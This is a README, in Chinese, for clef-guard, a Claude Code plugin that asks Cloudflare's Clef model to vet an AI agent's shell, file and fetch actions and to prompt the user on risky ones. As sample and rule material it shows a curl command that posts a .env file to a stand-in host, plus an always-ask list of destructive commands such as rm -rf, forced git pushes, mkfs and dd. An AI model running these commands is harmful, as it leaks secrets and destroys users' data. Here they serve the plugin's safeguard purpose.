# clef-guard

讓 Cloudflare 的決策模型 [Clef](https://blog.cloudflare.com/clef-decision-models/) 在 Claude 執行 **Bash 指令、寫入檔案（Write）、修改檔案（Edit）、讀取網址（WebFetch）** 之前先判斷一次。有風險、跟你的要求無關，或是屬於「一定要問」的操作時，clef-guard 會先跳出問題問你，你選「執行」才會執行。default、auto 等各種權限模式都一樣。也可以打開自動放行，讓 Clef 很有把握是唯讀的動作不再跳權限視窗。

這是「System One」的用法：Clef 是快思考，只負責答案有限的判斷，幾百毫秒內給出機率；Claude 是慢思考，負責推理和動手。

```
╭ clef-guard
│ · Clef 判斷有 90% 的機率難以復原或具破壞性（最可能：破壞性，外送資料）
│ · Clef 判斷這和你最近的要求無關（85%）
│
│ curl -d @.env https://paste.example.com
│
│ 要執行嗎？
❯ 1. 執行
  2. 不要執行
```

狀態列會顯示最近一次的判斷：

```
⚠ clef-guard: Bash · Clef 風險 90% · 破壞性 · 外送資料 · 214ms · 你已確認
```

## 安裝

在終端機的 Claude Code 中輸入：

```
/plugin install clef-guard --marketplace williamchen0606/claude-mods
```

安裝時會要求填入 Cloudflare 的設定（見下方）。

## 準備 Cloudflare API Token

1. 登入 [dash.cloudflare.com](https://dash.cloudflare.com) → 右上角頭像 → **My Profile** → **API Tokens** → **Create Token**。
2. 選 **Workers AI** 範本（或自訂 Token，只給 `Account` → `Workers AI` → `Read`），**Account Resources** 選你的帳號，建議設定到期日。
3. 建立後 Token 只會顯示一次，請存進密碼管理器。
4. 在控制台的帳號首頁或 **Workers & Pages** 概覽頁複製 **Account ID**。

## 設定

| 選項 | 預設 | 說明 |
| --- | --- | --- |
| `accountId` | （空） | Cloudflare Account ID；沒填時讀環境變數 `CLOUDFLARE_ACCOUNT_ID` |
| `apiToken` | （空） | Cloudflare API Token，存在系統的安全儲存區，不會寫進 settings.json；沒填時讀環境變數 `CLOUDFLARE_API_TOKEN` |
| `model` | `clef` | `clef`（27B，最準）、`clef-flash`（9B，最快、最便宜）或 `clef-omni`（30B 混合專家模型，也能看圖片、聲音和影片） |
| `threshold` | `0.5` | Clef 判斷「難以復原或破壞性」的機率達到這個值（0 到 1）就先問你 |
| `tools` | `Bash, Write, Edit, WebFetch` | 要檢查哪些工具，用逗號分隔；留空等於全部 |
| `sendRequests` | 開 | 把你最近三則訊息（遮掉密碼後）一起送給 Clef，讓它判斷動作跟你的要求符不符 |
| `autoApprove` | 關 | Claude Code 原本要跳權限視窗、而 Clef 有 95% 以上把握是唯讀又符合你的要求時，直接放行 |
| `alwaysAsk` | （空） | 除了內建規則，另外一定要問的指令開頭，用逗號分隔，例如 `terraform destroy, kubectl delete` |

**不要把 Token 寫進任何會 commit 的檔案**（包括專案的 `.claude/settings.json`）。用安裝時的設定畫面，或在自己的 shell 設定環境變數。

### 該選哪個模型

依 Cloudflare 公布的數據：

| 模型 | 價格（每百萬輸入 token） | 延遲 | 說明 |
| --- | --- | --- | --- |
| `clef` | $0.24 | 中位數約 100 到 120 ms（原本約 209 ms，Cloudflare 改善伺服後快了 1.7 到 2 倍） | 最準 |
| `clef-flash` | $0.038 | 約 39 ms | 最快、最便宜；託管版的上下文縮小到 24k，判斷一個動作綽綽有餘 |
| `clef-omni` | $0.15 | 純文字中位數約 130 ms | 新的多模態模型，以 Qwen3-Omni-30B-A3B 為基礎 |

一次判斷會問四個問題，加上你最近的訊息，約送出 800 到 1,500 個 token。每天 1,000 次判斷用 `clef` 大約 $0.20 到 $0.35。Claude 每一輪本來就要好幾秒，多出的延遲幾乎感覺不到，而安全判斷寧可準一點，所以預設用 `clef`。clef-guard 只送文字，用不到 `clef-omni` 的圖片、聲音和影片能力；想在價格和速度之間取個中間值時可以選它。

## 運作方式

Claude Code 照自己的規則（allow / deny 清單、權限模式）先決定，clef-guard 再看：

1. 原本就**擋下** → 不變，也不呼叫 Clef。
2. 符合**一定要問的規則** → 一定問你（見下一節），不管 Clef 怎麼判斷、有沒有設定 Token、有沒有開自動放行。
3. Claude Code 原本就放行的**單純讀取指令**（`ls`、`cat`、`grep`、`git status`、`git diff` 等，沒有管線、重新導向或變數）→ 不送 Clef，省下延遲。
4. 其他情況一次問 Clef 四個問題：
   - **風險等級**：無害、專案內修改、對外變更、難以復原、破壞性。
   - **風險類型**：刪除資料、改寫 git 歷史、改系統設定、執行下載的程式、外送資料、專案外變更。
   - **是否唯讀**。
   - **是否符合你最近的要求**（`sendRequests` 開著時）。
5. 依 Clef 的答案：
   - 「難以復原」加「破壞性」的機率**達到門檻** → 問你。
   - Clef 有 80% 以上把握這個動作**跟你的要求無關**，而且會動到專案以外（對外變更以上）→ 問你。
   - 開了 `autoApprove`、Claude Code 原本要跳權限視窗、Clef 有 95% 以上把握是唯讀、等級是無害，而且沒有判斷成跟要求無關 → **直接放行**。
   - 其他 → 照 Claude Code 原本的規則處理，不會多問。

問你的時候：

- 選「執行」才會執行，選「不要執行」就擋下。
- 也可以在「Type something」輸入文字，例如「先備份再刪」。動作不會執行，你輸入的內容會轉告 Claude，讓它換個做法。
- 對話框被關掉、沒有選「執行」，或在 `claude -p` 這類無法詢問的情況下，一律**不執行**。

### 一定要問的操作

這些 Bash 指令不靠 Clef，由 clef-guard 在本機直接判斷，每次都會問你：

- 遞迴刪除：`rm -r`、`rm -rf`、`rm --recursive`。
- 刪除 git repo：`rm` 的對象是 `.git`、`gh repo delete`、`gh api -X DELETE repos/<owner>/<repo>`。
- 強制推送或刪除遠端分支：`git push --force`、`-f`、`--force-with-lease`、`--mirror`、`+branch`、`--delete`、`:branch`。
- 抹除磁碟或檔案：`mkfs`、`dd of=/dev/…`、`wipefs`、`shred`。
- 你在 `alwaysAsk` 加的指令開頭。

會看穿常見的包裝，例如 `sudo`、`env`、`xargs`、`bash -c "…"`、`eval`、`$(…)`，以及用 `&&`、`;`、`|` 串起來的指令。這是經驗規則，不是完整的 shell 解析器，所以 Clef 仍然是第二道防線。

### 為什麼自己問，而不是交給權限視窗

如果只回答「需要確認」（`ask`），Claude Code 會交給目前權限模式的決策者處理。在 auto 模式下，決策者是一個分類器，不是你，結果有風險的動作可能沒問你就執行了。所以 clef-guard 在需要確認時會直接問你，確保在任何模式下都由你決定。

### 送出去的資料

- 每次判斷都會送到 Cloudflare Workers AI。Cloudflare 聲明不讀取、不儲存、不用於訓練，但送出前請確認符合你的資安要求。
- 送出的內容：
  - Bash：指令本身。Claude 為指令寫的說明不會送出，避免說明文字影響判斷。
  - Write：檔案路徑、是否在專案內、檔案內容的前 2,000 字。
  - Edit：檔案路徑、是否在專案內、要取代的文字和新文字（各前 1,000 字）。
  - WebFetch：網址。
  - `sendRequests` 開著時，再加上你最近三則訊息（每則前 800 字）。
- 路徑在專案內時改成相對路徑（`./src/a.ts`），在家目錄下時改成 `~/…`。
- 送出前會先遮掉看起來像密碼的內容：`Authorization` / `Bearer` 標頭、名稱含 `TOKEN`、`SECRET`、`PASSWORD`、`API_KEY` 的變數、`--password` 這類參數、網址裡的帳密、常見的金鑰格式（`sk-`、`ghp_`、`AKIA` 等）、私鑰，以及 40 字元以上英數混合的字串。這是經驗規則，不保證抓到所有密碼。

## 限制

- **它不是安全閘門。** Clef 是機率模型，會判錯；一定要問的規則也只是經驗規則。請照常使用 Claude Code 的 allow / deny 規則，這個 mod 只是多一層提醒。
- Clef 出錯、逾時（超過 2 秒）或沒有設定 Token 時，動作照 Claude Code 原本的規則處理（一定要問的操作除外），狀態列會顯示「Clef 未判斷」和原因。
- 每個需要判斷的動作都會多等一次 Clef 的回應。實際延遲會比 Cloudflare 公布的數字多出你到 Cloudflare 的網路往返時間，大約 0.5 到 0.8 秒。Write 和 Edit 很頻繁，覺得慢的話可以用 `tools` 只檢查 Bash。
- 被 clef-guard 攔下的動作，即使已經在 allow 清單裡，也會再問你一次。如果太常誤判，可以調高 `threshold`。
- 自動放行只會把「要跳權限視窗」改成「放行」，不會推翻 deny 規則，也不會放行一定要問的操作。
- 「跟要求無關」的判斷只看你最近三則訊息。訊息很短（例如「繼續」）時，Clef 可能看不出脈絡。
